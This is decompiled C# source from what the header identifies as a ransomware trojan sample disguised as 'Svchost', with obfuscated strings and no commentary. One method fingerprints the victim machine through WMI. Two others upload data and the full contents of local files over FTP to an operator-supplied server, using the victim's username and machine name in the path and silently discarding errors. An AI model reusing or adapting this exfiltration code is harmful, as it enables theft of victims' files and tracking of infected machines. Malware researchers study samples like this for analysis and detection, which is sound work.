// Decompiled with JetBrains decompiler
// Type: qYAjLWajCJpnf.UuDMKkzrJStt
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9AAAE71-E61A-4958-B1A7-6590C53648E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-8c723af5c826adea162ef3f2e37a1cca7b43d549c9a5fab7c9ff17f65eb5d8e7.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace qYAjLWajCJpnf
{
  internal sealed class UuDMKkzrJStt
  {
    [NonSerialized]
    internal static GetString \u0086;

    public static string GtkPFNFnFTX()
    {
      string empty = string.Empty;
      try
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementClass(UuDMKkzrJStt.\u0086(107458804)).GetInstances().GetEnumerator())
        {
          if (enumerator.MoveNext())
            empty = enumerator.Current.Properties[UuDMKkzrJStt.\u0086(107458783)].Value.ToString();
        }
        string str = UuDMKkzrJStt.\u0086(107458734);
        ManagementObject managementObject = new ManagementObject(UuDMKkzrJStt.\u0086(107458729) + str + UuDMKkzrJStt.\u0086(107459232));
        managementObject.Get();
        return managementObject[UuDMKkzrJStt.\u0086(107459227)].ToString();
      }
      catch (Exception ex)
      {
        return string.IsNullOrEmpty(empty) ? UuDMKkzrJStt.\u0086(107350585) : empty;
      }
    }

    public static void ztOsxsyMoKN(
      string efkQvwcndhFDDB = "URL",
      string rctuwkmhasIeW = "USERNAME",
      string dvNbyvdYIPDhpS = "ACCESO",
      string mDQQjJvbdl = "")
    {
      try
      {
        string str = UuDMKkzrJStt.GtkPFNFnFTX();
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(efkQvwcndhFDDB + UuDMKkzrJStt.\u0086(107460527) + Environment.UserName + UuDMKkzrJStt.\u0086(107460546) + Environment.MachineName + UuDMKkzrJStt.\u0086(107459981) + str + UuDMKkzrJStt.\u0086(107459976));
        ftpWebRequest.Method = UuDMKkzrJStt.\u0086(107459202);
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(rctuwkmhasIeW, dvNbyvdYIPDhpS);
        byte[] bytes = new ASCIIEncoding().GetBytes(mDQQjJvbdl);
        ftpWebRequest.ContentLength = (long) bytes.Length;
        using (Stream requestStream = ftpWebRequest.GetRequestStream())
          requestStream.Write(bytes, 0, bytes.Length);
      }
      catch
      {
      }
    }

    public static void xLFYxlCXWb(
      string kZjKVzrMGrPyBYtfB = "URL",
      string iGToWFQHNacvHhs = "USERNAME",
      string zwCjunbPUBQKOnB = "ACCESO",
      string sQErFXcCuExpYz = "")
    {
      try
      {
        string str = UuDMKkzrJStt.GtkPFNFnFTX();
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(kZjKVzrMGrPyBYtfB + UuDMKkzrJStt.\u0086(107460527) + Environment.UserName + UuDMKkzrJStt.\u0086(107460546) + Environment.MachineName + UuDMKkzrJStt.\u0086(107459981) + str + UuDMKkzrJStt.\u0086(107459981) + Path.GetFileName(sQErFXcCuExpYz));
        ftpWebRequest.Method = UuDMKkzrJStt.\u0086(107459202);
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(iGToWFQHNacvHhs, zwCjunbPUBQKOnB);
        byte[] buffer = System.IO.File.ReadAllBytes(sQErFXcCuExpYz);
        ftpWebRequest.ContentLength = (long) buffer.Length;
        using (Stream requestStream = ftpWebRequest.GetRequestStream())
          requestStream.Write(buffer, 0, buffer.Length);
      }
      catch
      {
      }
    }

    static UuDMKkzrJStt() => Strings.CreateGetStringDelegate(typeof (UuDMKkzrJStt));
  }
}
